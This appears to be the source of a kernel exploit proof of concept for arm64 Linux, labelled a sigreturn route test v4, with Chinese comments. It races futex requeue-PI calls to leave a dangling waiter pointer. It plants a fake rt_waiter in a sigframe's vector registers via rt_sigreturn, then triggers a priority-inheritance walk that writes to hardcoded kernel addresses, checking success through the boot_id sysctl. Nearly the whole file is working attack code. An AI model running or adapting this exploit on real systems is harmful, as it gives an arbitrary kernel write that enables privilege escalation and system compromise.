/* PD2238 sigreturn 路线验证 v4 — 完整自包含版
 * 流程: waiter 触发悬垂 pib → 构造 sigframe(vregs=fake waiter) → rt_sigreturn
 *       → 内核把 vregs 拷到内核栈深度0x300(覆盖rt_waiter位置)
 *       → sigreturn 跳回死循环(保持内核栈) → consumer 打点触发 walk → 写!
 */
static long sys(long n,long a,long b,long c,long d,long e,long f){
  register long x8 __asm__("x8")=n; register long x0 __asm__("x0")=a;
  register long x1 __asm__("x1")=b; register long x2 __asm__("x2")=c;
  register long x3 __asm__("x3")=d; register long x4 __asm__("x4")=e;
  register long x5 __asm__("x5")=f;
  __asm__ volatile("svc #0":"+r"(x0):"r"(x8),"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5):"memory");
  return x0;
}
#define SYS_write 64
#define SYS_read 63
#define SYS_openat 56
#define SYS_close 57
#define SYS_nanosleep 101
#define SYS_futex 98
#define SYS_clock_gettime 113
#define SYS_gettid 178
#define SYS_rt_sigreturn 139
#define SYS_sched_setattr 274
#define SYS_mkdirat 34
#define SYS_mount 40
#define SYS_fcntl 25
#define SYS_dup3 24
#define SYS_timerfd_create 85
#define FUTEX_LOCK_PI 6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define CLOCK_MONOTONIC 1
#define AT_FDCWD -100
#define SCHED_OTHER 0
#define SCHED_BATCH 3
#define CLONE_FLAGS 0x50f00

#define KBASE            0xffffffc008000000UL
#define SYSCTL_BOOTID    (KBASE + 0x02ee910dUL)
#define INIT_TASK        (KBASE + 0x02aec240UL)
#define SCRATCH          (KBASE + 0x02e90000UL)
#define NFDS             320

static void puts_(const char*s){long n=0;while(s[n])n++;sys(SYS_write,1,(long)s,n,0,0,0);}
static void putx_(unsigned long v){
  char b[18]; b[0]='0'; b[1]='x';
  for(int i=0;i<16;i++){ int nib=(v>>((15-i)*4))&0xf; b[2+i]= nib<10?('0'+nib):('a'+nib-10); }
  sys(SYS_write,1,(long)b,18,0,0,0);
}
static void nsleep_us(long us){long ts[2]={us/1000000,(us%1000000)*1000};sys(SYS_nanosleep,(long)ts,0,0,0,0,0);}
static void show_bootid(const char*tag){
  char buf[64]; for(int i=0;i<64;i++) buf[i]=0;
  long fd=sys(SYS_openat,AT_FDCWD,(long)"/proc/sys/kernel/random/boot_id",0,0,0,0);
  puts_(tag);
  if(fd<0){ puts_("<err>\n"); return; }
  long n=sys(SYS_read,fd,(long)buf,60,0,0,0);
  sys(SYS_close,fd,0,0,0,0,0);
  if(n>0) sys(SYS_write,1,(long)buf,n,0,0,0);
  puts_("\n");
}
__attribute__((naked)) static long thr_clone(long flags,void*stack,int(*fn)(void*),void*arg){
  __asm__ volatile(
    "mov x9, x2\n" "mov x10, x3\n"
    "mov x2, #0\n" "mov x3, #0\n" "mov x4, #0\n"
    "mov x8, #220\n" "svc #0\n"
    "cbnz x0, 1f\n"
    "mov x0, x10\n" "blr x9\n"
    "mov x8, #93\n" "svc #0\n"
    "1:\n" "ret\n");
}

volatile unsigned int f_wait, f_pi_target, f_pi_chain;
volatile int waiter_ready, owner_started, waiter_waiting, armed;
volatile long waiter_tid;
static char wstack[65536] __attribute__((aligned(16)));
static char ostack[65536] __attribute__((aligned(16)));
static char cstack[65536] __attribute__((aligned(16)));

struct sched_attr{unsigned int size;unsigned int policy;unsigned long long flags;
  int nice;unsigned int priority;unsigned long long runtime,deadline,period;};

/* ===== sigframe 布局常量 ===== */
#define OFF_UC           0x080   /* siginfo 128B */
#define OFF_MC           (OFF_UC+0x128) /* ucontext 到 mcontext */
#define OFF_RESERVED     (OFF_MC+0x118) /* mcontext 到 __reserved */

/* ===== 全局 sigframe ===== */
static unsigned char sigframe_buf[0x1500] __attribute__((aligned(16)));

/* sigreturn 后跳转目标: 死循环保持内核栈 (不能有任何 syscall!) */
static volatile unsigned long spin_count;
static void after_sigreturn_loop(void){
  volatile unsigned long x=0;
  for(;;){ x++; }
}

static void build_sigframe(void){
  for(unsigned i=0;i<sizeof(sigframe_buf);i++) sigframe_buf[i]=0;
  unsigned char *res = sigframe_buf + OFF_RESERVED;
  /* fpsimd_context @ reserved+0 */
  *(unsigned int*)(res+0x00) = 0x46508001;
  *(unsigned int*)(res+0x04) = 0x210;
  *(unsigned int*)(res+0x08) = 0;  /* fpsr */
  *(unsigned int*)(res+0x0C) = 0;  /* fpcr */
  /* fake rt_waiter @ reserved+0x10 (vregs 开始) */
  unsigned long *v = (unsigned long*)(res+0x10);
  unsigned long parent = SCRATCH + 0x108;
  v[0] = parent;         /* tree.pc = 写值 */
  v[1] = 0;              /* tree.right */
  v[2] = SYSCTL_BOOTID;  /* tree.left = 写入目标 */
  v[3] = parent;         /* pi_tree.pc */
  v[4] = 0;              /* pi_tree.right */
  v[5] = SYSCTL_BOOTID;  /* pi_tree.left */
  v[6] = INIT_TASK;      /* task */
  v[7] = SCRATCH;        /* lock */
  v[8] = 3;              /* prio */
  /* terminator 在 res+0x220 (全零) ✓ */
  /* 设置 pc → after_sigreturn_loop */
  unsigned long target = (unsigned long)&after_sigreturn_loop;
  __builtin_memcpy(sigframe_buf + OFF_MC + 0x108, &target, 8);
}

static void open_fds_for_pselect(void){
  long tfd = sys(SYS_timerfd_create,CLOCK_MONOTONIC,0,0,0,0,0);
  long hi  = sys(SYS_fcntl,tfd,0,NFDS+64,0,0,0);
  sys(SYS_close,tfd,0,0,0,0,0);
  /* 开 NFDS 个 fd 让 max_select_fd 不截断 */
  for(long fd=0;fd<NFDS;fd++){
    sys(SYS_dup3,hi,fd,0,0,0,0);
  }
}

/* ===== 线程函数 ===== */
static int waiter_fn(void*a){
  (void)a;
  waiter_tid = sys(SYS_gettid,0,0,0,0,0,0);
  puts_("WTID="); putx_((unsigned long)waiter_tid); puts_("\n");
  sys(SYS_futex,(long)&f_pi_chain,FUTEX_LOCK_PI,0,0,0,0);
  waiter_ready=1;
  while(!owner_started) nsleep_us(1000);
  long to[2]; sys(SYS_clock_gettime,CLOCK_MONOTONIC,(long)to,0,0,0,0);
  to[0]+=3;
  waiter_waiting=1;
  sys(SYS_futex,(long)&f_wait,FUTEX_WAIT_REQUEUE_PI,0,(long)to,(long)&f_pi_target,0);
  puts_("W_RET(pib_dangling)\n");
  nsleep_us(300000);  /* 等 main requeue 完成 */
  /* 构造并执行 sigreturn */
  build_sigframe();
  open_fds_for_pselect();
  puts_("CALL_SIGRETURN\n");
  /* SP 指向 sigframe, svc rt_sigreturn → 内核读 sigframe → 拷贝 FPSIMD 到内核栈 */
  __asm__ volatile(
    "mov sp, %0\n"
    "mov x8, #139\n"
    "svc #0\n"
    : : "r" (sigframe_buf) : "x8", "sp"
  );
  /* sigreturn 成功跳到 after_sigreturn_loop (纯CPU死循环, 不覆盖内核栈) */
  puts_("SIGRETURN_LOOP\n");   /* 这行不会执行 (死循环在 asm 里) */
  for(;;){}
}
static int owner_fn(void*a){
  (void)a;
  sys(SYS_futex,(long)&f_pi_target,FUTEX_LOCK_PI,0,0,0,0);
  while(!waiter_ready) nsleep_us(1000);
  owner_started=1;
  sys(SYS_futex,(long)&f_pi_chain,FUTEX_LOCK_PI,0,0,0,0);
  for(;;) nsleep_us(500000);
}
static int consumer_fn(void*a){
  (void)a;
  while(!armed) nsleep_us(10000);
  puts_("CONSUMER_ON\n");
  long i=0;
  while(armed){
    struct sched_attr at; char*p=(char*)&at; for(unsigned k=0;k<sizeof(at);k++)p[k]=0;
    at.size=sizeof(at);
    at.policy=(i&1)?SCHED_BATCH:SCHED_OTHER;
    at.nice=(int)(i%19)+1;
    sys(SYS_sched_setattr,waiter_tid,(long)&at,0,0,0,0);
    i++;
    nsleep_us(5000);
  }
  puts_("CONSUMER_OFF\n");
  for(;;) nsleep_us(500000);
}

void _start(void){
  puts_("\n=== SIGRET-V4 ===\n");
  sys(SYS_mkdirat,AT_FDCWD,(long)"/proc",0755,0,0,0);
  sys(SYS_mount,(long)"proc",(long)"/proc",(long)"proc",0,0,0);
  show_bootid("BOOTID_BEFORE=");
  thr_clone(CLONE_FLAGS,ostack+sizeof(ostack),owner_fn,0);
  thr_clone(CLONE_FLAGS,wstack+sizeof(wstack),waiter_fn,0);
  thr_clone(CLONE_FLAGS,cstack+sizeof(cstack),consumer_fn,0);
  while(!waiter_waiting || !owner_started) nsleep_us(1000);
  nsleep_us(100000);
  sys(SYS_futex,(long)&f_wait,FUTEX_CMP_REQUEUE_PI,1,1,(long)&f_pi_target,0);
  puts_("REQUEUE_DONE\n");
  /* 等 consumer 完成 (armed 被 main 设为 1 后永不清除, 用超时) */
  nsleep_us(60000000);  /* 60 秒窗口给 consumer 充分打点 */
  armed=0;
  show_bootid("BOOTID_AFTER=");
  puts_("=== SIGRET-V4-DONE ===\n");
  for(;;) nsleep_us(500000);
}
